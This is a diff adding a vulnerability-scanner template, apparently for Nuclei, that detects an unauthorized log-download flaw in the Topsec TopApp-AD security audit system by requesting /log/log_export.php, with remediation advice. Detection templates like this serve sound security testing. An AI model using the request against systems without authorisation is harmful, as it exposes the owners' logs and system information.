@@ -1,0 +1,27 @@
+id: SecurityCheckerSys-Unauth-DownloadLogs
+info:
+  name: Topsec Network Defender security audit system unauthorized log download
+  author:
+  - l0ne1y
+  description: |-
+    Topsec Network Defender security audit system unauthorized log download vulnerability
+    Topsec TopApp-AD has an unauthorized access vulnerability. Attackers can exploit it to download system logs and thereby obtain system information.
+  severity: medium
+  remediation: |
+    Official remedy:
+    1. It is recommended that users obtain the latest patch or the latest version program from the official website:
+    https://www.topsec.com.cn/
+
+    Temporary remedy:
+    1. Validate user input on both the frontend and backend simultaneously, using a dual validation mechanism.
+    2. Verify whether the user has permission to invoke the relevant functionality before calling it.
+    3. Prohibit recording sensitive data in plaintext in logs: prohibit recording sensitive plaintext data in logs (such as passwords, session identifiers jsessionid, etc.) to prevent sensitive information leakage.
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - ' contains(body,"superman") && status_code==200 '
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/log/log_export.php'
+  method: GET
